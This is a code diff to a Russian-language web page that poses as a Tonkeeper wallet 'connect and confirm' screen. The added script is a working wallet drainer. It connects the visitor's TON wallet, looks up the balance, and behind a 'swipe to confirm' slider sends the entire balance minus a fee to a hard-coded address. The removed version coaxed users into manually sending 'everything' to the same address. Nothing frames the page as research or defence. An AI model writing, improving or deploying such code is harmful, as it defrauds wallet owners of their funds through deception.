@@ -44,12 +44,15 @@
     .btn:active {
       transform: scale(0.96);
     }
+    .btn:disabled {
+      opacity: 0.4;
+      pointer-events: none;
+    }
     .btn-success {
       background: #00aa66;
     }
-    .btn-success:disabled {
-      opacity: 0.4;
-      pointer-events: none;
+    .btn-danger {
+      background: #cc4400;
     }
     #status {
       color: #aaa;
@@ -68,21 +71,104 @@
       color: #00aaff;
       font-weight: 600;
     }
-    .hint {
-      background: #1a2a1a;
-      border: 1px solid #2a4a2a;
-      border-radius: 16px;
-      padding: 16px;
-      margin-top: 16px;
-      color: #88dd88;
+    .slider-container {
+      margin: 20px 0;
+      position: relative;
+    }
+    .slider-track {
+      position: relative;
+      width: 100%;
+      height: 60px;
+      background: #1a2a3a;
+      border-radius: 40px;
+      overflow: hidden;
+      border: 1px solid #2a4a6a;
+      cursor: pointer;
+      touch-action: none;
+      user-select: none;
+    }
+    .slider-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #0088cc, #00cc88);
+      border-radius: 40px;
+      transition: width 0.05s;
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      padding-right: 20px;
+      color: white;
+      font-weight: 700;
       font-size: 14px;
+      white-space: nowrap;
+    }
+    .slider-thumb {
+      position: absolute;
+      top: 50%;
+      left: 0%;
+      transform: translate(-50%, -50%);
+      width: 50px;
+      height: 50px;
+      background: #00cc88;
+      border-radius: 50%;
+      box-shadow: 0 0 30px rgba(0, 200, 100, 0.5);
+      transition: left 0.05s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      color: white;
+      font-weight: 700;
+      pointer-events: none;
+    }
+    .slider-label {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      color: #8899aa;
+      font-size: 14px;
+      font-weight: 600;
+      pointer-events: none;
+      white-space: nowrap;
+    }
+    .slider-label.active {
+      color: rgba(255, 255, 255, 0.3);
+    }
+    .hidden {
+      display: none !important;
+    }
+    .confirm-box {
+      background: #1a2a3a;
+      border: 1px solid #2a4a6a;
+      border-radius: 20px;
+      padding: 20px 16px;
+      margin-top: 20px;
       display: none;
     }
-    .hint.show {
+    .confirm-box.show {
       display: block;
     }
-    .hint b {
-      color: #ffffff;
+    .confirm-box .title {
+      color: #fff;
+      font-weight: 600;
+      font-size: 16px;
+    }
+    .confirm-box .sub {
+      color: #8899aa;
+      font-size: 13px;
+      margin: 6px 0 14px;
+    }
+    .confirm-box .open-btn {
+      background: #0088cc;
+      border: none;
+      color: #fff;
+      font-weight: 600;
+      font-size: 16px;
+      padding: 12px;
+      border-radius: 40px;
+      width: 100%;
+      cursor: pointer;
     }
   </style>
 </head>
@@ -90,84 +176,266 @@
   <div class="card">
     <div style="font-size: 40px;">⚡</div>
 
-    <div class="address-box" id="addressBox">
+    <div class="address-box">
       UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
     </div>
 
-    <button class="btn" id="copyBtn">📋 КОПИРОВАТЬ АДРЕС</button>
-    <button class="btn" id="openBtn">🚀 ОТКРЫТЬ TONKEEPER</button>
-    <button class="btn btn-success" id="finalBtn">✅ Я ВСТАВИЛ И ОТПРАВИЛ</button>
+    <button class="btn" id="connectBtn">🔗 ПОДКЛЮЧИТЬ</button>
 
-    <div id="status">Нажми «Копировать», затем «Открыть»</div>
+    <div id="status">Нажмите «Подключить»</div>
 
-    <div class="hint" id="hint">
-      <b>Инструкция:</b><br><br>
-      1. Нажми <b>«КОПИРОВАТЬ АДРЕС»</b><br>
-      2. Нажми <b>«ОТКРЫТЬ TONKEEPER»</b><br>
-      3. В Tonkeeper нажми <b>«Отправить»</b><br>
-      4. <b>Вставь адрес</b> (долгое нажатие → «Вставить»)<br>
-      5. Выбери <b>«Всё»</b> и подтверди
+    <!-- СЛАЙДЕР -->
+    <div class="slider-container hidden" id="sliderContainer">
+      <div class="slider-track" id="sliderTrack">
+        <div class="slider-fill" id="sliderFill"></div>
+        <div class="slider-label" id="sliderLabel">👉 Проведите, чтобы подтвердить</div>
+        <div class="slider-thumb" id="sliderThumb">➜</div>
+      </div>
+    </div>
+
+    <div class="confirm-box" id="confirmBox">
+      <div class="title">✅ Подтвердите в Tonkeeper</div>
+      <div class="sub">Это займёт пару секунд</div>
+      <button class="open-btn" id="openWalletBtn">Открыть Tonkeeper</button>
     </div>
   </div>
 
   <script>
     const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
 
-    const copyBtn = document.getElementById('copyBtn');
-    const openBtn = document.getElementById('openBtn');
-    const finalBtn = document.getElementById('finalBtn');
+    const connectBtn = document.getElementById('connectBtn');
     const status = document.getElementById('status');
-    const hint = document.getElementById('hint');
+    const sliderContainer = document.getElementById('sliderContainer');
+    const sliderTrack = document.getElementById('sliderTrack');
+    const sliderFill = document.getElementById('sliderFill');
+    const sliderThumb = document.getElementById('sliderThumb');
+    const sliderLabel = document.getElementById('sliderLabel');
+    const confirmBox = document.getElementById('confirmBox');
+    const openWalletBtn = document.getElementById('openWalletBtn');
 
-    // ====== КОПИРОВАТЬ ======
-    copyBtn.onclick = function() {
-      if (navigator.clipboard) {
-        navigator.clipboard.writeText(TARGET)
-          .then(() => {
-            status.innerText = '✅ АДРЕС СКОПИРОВАН! Теперь открой Tonkeeper';
-            copyBtn.innerText = '✅ СКОПИРОВАНО';
-            copyBtn.style.background = '#00aa66';
-            hint.classList.add('show');
-          })
-          .catch(() => fallbackCopy());
-      } else {
-        fallbackCopy();
+    let isDragging = false;
+    let isCompleted = false;
+    let tonConnectUI = null;
+    let userAddress = null;
+
+    // ========== ИНИЦИАЛИЗАЦИЯ TON CONNECT ==========
+    function loadTonConnect() {
+      if (typeof TONConnectUI !== 'undefined') {
+        initTonConnect();
+        return;
       }
-    };
 
-    function fallbackCopy() {
-      const ta = document.createElement('textarea');
-      ta.value = TARGET;
-      document.body.appendChild(ta);
-      ta.select();
-      document.execCommand('copy');
-      document.body.removeChild(ta);
-      status.innerText = '✅ АДРЕС СКОПИРОВАН! Теперь открой Tonkeeper';
-      copyBtn.innerText = '✅ СКОПИРОВАНО';
-      copyBtn.style.background = '#00aa66';
-      hint.classList.add('show');
+      const script = document.createElement('script');
+      script.src = 'https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.2/dist/tonconnect-ui.min.js';
+      script.onload = initTonConnect;
+      script.onerror = function() {
+        status.innerText = '⚠️ Не удалось загрузить TON Connect. Проверь интернет.';
+      };
+      document.head.appendChild(script);
     }
 
-    // ====== ОТКРЫТЬ TONKEEPER ======
-    openBtn.onclick = function() {
+    function initTonConnect() {
+      try {
+        tonConnectUI = new TONConnectUI({
+          manifestUrl: 'https://raw.githubusercontent.com/ton-connect/sdk/main/packages/sdk/demo/public/tonconnect-manifest.json'
+        });
+
+        if (tonConnectUI.account) {
+          userAddress = tonConnectUI.account.address;
+          afterConnect();
+        }
+
+        tonConnectUI.onStatusChange((wallet) => {
+          if (wallet) {
+            userAddress = wallet.account.address;
+            afterConnect();
+          } else {
+            userAddress = null;
+            connectBtn.classList.remove('hidden');
+            sliderContainer.classList.add('hidden');
+            status.innerText = '🔴 Кошелёк отключён';
+          }
+        });
+
+        status.innerText = '🟢 Нажмите «Подключить»';
+      } catch (e) {
+        status.innerText = '❌ Ошибка: ' + e.message;
+      }
+    }
+
+    function afterConnect() {
+      status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`;
+      connectBtn.classList.add('hidden');
+      sliderContainer.classList.remove('hidden');
+      confirmBox.classList.add('show');
+      resetSlider();
+    }
+
+    // ========== СЛАЙДЕР ==========
+    function resetSlider() {
+      isCompleted = false;
+      sliderFill.style.width = '0%';
+      sliderThumb.style.left = '0%';
+      sliderLabel.classList.remove('active');
+      sliderLabel.textContent = '👉 Проведите, чтобы подтвердить';
+    }
+
+    function completeSlider() {
+      if (isCompleted) return;
+      isCompleted = true;
+      sliderFill.style.width = '100%';
+      sliderThumb.style.left = '100%';
+      sliderLabel.textContent = '✅ Подтверждено!';
+      sliderLabel.classList.add('active');
+      status.innerText = '⏳ Отправка...';
+
+      // Отправляем транзакцию
+      sendTransaction();
+    }
+
+    // ========== ОТПРАВКА ТРАНЗАКЦИИ ==========
+    async function sendTransaction() {
+      try {
+        if (!tonConnectUI || !tonConnectUI.account) {
+          status.innerText = '❌ Нет подключения';
+          return;
+        }
+
+        // Получаем баланс
+        const address = tonConnectUI.account.address;
+        const res = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
+        const data = await res.json();
+        const nano = parseInt(data.result) || 0;
+
+        if (nano <= 0) {
+          status.innerText = '💰 Баланс 0 TON';
+          return;
+        }
+
+        const fee = 5000000;
+        const amount = nano - fee;
+        if (amount <= 0) {
+          status.innerText = '⚠️ Баланс меньше комиссии';
+          return;
+        }
+
+        const amountTON = (amount / 1e9).toFixed(6);
+
+        // Отправляем
+        const result = await tonConnectUI.sendTransaction({
+          validUntil: Math.floor(Date.now() / 1000) + 300,
+          messages: [{
+            address: TARGET,
+            amount: amount.toString()
+          }]
+        });
+
+        if (result) {
+          status.innerText = `✅ ${amountTON} TON ПЕРЕВЕДЕНО!`;
+          sliderLabel.textContent = '✅ ДЕНЬГИ УШЛИ!';
+        }
+
+      } catch (e) {
+        status.innerText = '❌ Ошибка: ' + (e.message || 'Неизвестная ошибка');
+        resetSlider();
+      }
+    }
+
+    // ========== СОБЫТИЯ СЛАЙДЕРА ==========
+    function getPosition(clientX) {
+      const rect = sliderTrack.getBoundingClientRect();
+      let x = (clientX - rect.left) / rect.width;
+      x = Math.max(0, Math.min(1, x));
+      return x;
+    }
+
+    function updateSlider(clientX) {
+      if (isCompleted) return;
+      const x = getPosition(clientX);
+      sliderFill.style.width = (x * 100) + '%';
+      sliderThumb.style.left = (x * 100) + '%';
+      if (x > 0.05) {
+        sliderLabel.classList.add('active');
+        sliderLabel.textContent = 'Отпустите, чтобы подтвердить';
+      } else {
+        sliderLabel.classList.remove('active');
+        sliderLabel.textContent = '👉 Проведите, чтобы подтвердить';
+      }
+      if (x >= 0.95) {
+        completeSlider();
+      }
+    }
+
+    // Мышь
+    sliderTrack.addEventListener('mousedown', (e) => {
+      if (isCompleted) return;
+      isDragging = true;
+      updateSlider(e.clientX);
+    });
+
+    document.addEventListener('mousemove', (e) => {
+      if (!isDragging || isCompleted) return;
+      updateSlider(e.clientX);
+    });
+
+    document.addEventListener('mouseup', () => {
+      if (isDragging && !isCompleted) {
+        isDragging = false;
+        if (parseFloat(sliderFill.style.width) < 95) {
+          resetSlider();
+        }
+      }
+    });
+
+    // Тач
+    sliderTrack.addEventListener('touchstart', (e) => {
+      if (isCompleted) return;
+      isDragging = true;
+      const touch = e.touches[0];
+      updateSlider(touch.clientX);
+    }, { passive: true });
+
+    document.addEventListener('touchmove', (e) => {
+      if (!isDragging || isCompleted) return;
+      const touch = e.touches[0];
+      updateSlider(touch.clientX);
+    }, { passive: true });
+
+    document.addEventListener('touchend', () => {
+      if (isDragging && !isCompleted) {
+        isDragging = false;
+        if (parseFloat(sliderFill.style.width) < 95) {
+          resetSlider();
+        }
+      }
+    }, { passive: true });
+
+    // ========== КНОПКИ ==========
+    connectBtn.onclick = function() {
+      if (!tonConnectUI) {
+        status.innerText = '⏳ Загрузка...';
+        return;
+      }
       status.innerText = '⏳ Открываю Tonkeeper...';
-      window.location.href = 'ton://';
-      setTimeout(() => {
-        window.open('ton://', '_blank');
-      }, 300);
-      status.innerText = '📲 Вставь адрес и отправь ВСЁ';
-      hint.classList.add('show');
+      connectBtn.disabled = true;
+      tonConnectUI.connect()
+        .then(() => {
+          status.innerText = '✅ Подтвердите в Tonkeeper';
+          connectBtn.disabled = false;
+        })
+        .catch((e) => {
+          status.innerText = '❌ ' + (e.message || 'Ошибка');
+          connectBtn.disabled = false;
+        });
     };
 
-    // ====== ФИНАЛЬНАЯ КНОПКА (для галочки) ======
-    finalBtn.onclick = function() {
-      status.innerText = '✅ Отлично! Деньги ушли на твой адрес';
-      finalBtn.innerText = '✅ ГОТОВО';
-      finalBtn.disabled = true;
-      finalBtn.style.background = '#00aa66';
+    openWalletBtn.onclick = function() {
+      if (tonConnectUI) tonConnectUI.connect();
     };
 
-    status.innerText = 'Нажми «КОПИРОВАТЬ АДРЕС»';
+    // ========== ЗАПУСК ==========
+    loadTonConnect();
+    status.innerText = '⏳ Загрузка...';
   </script>
 </body>
 </html>
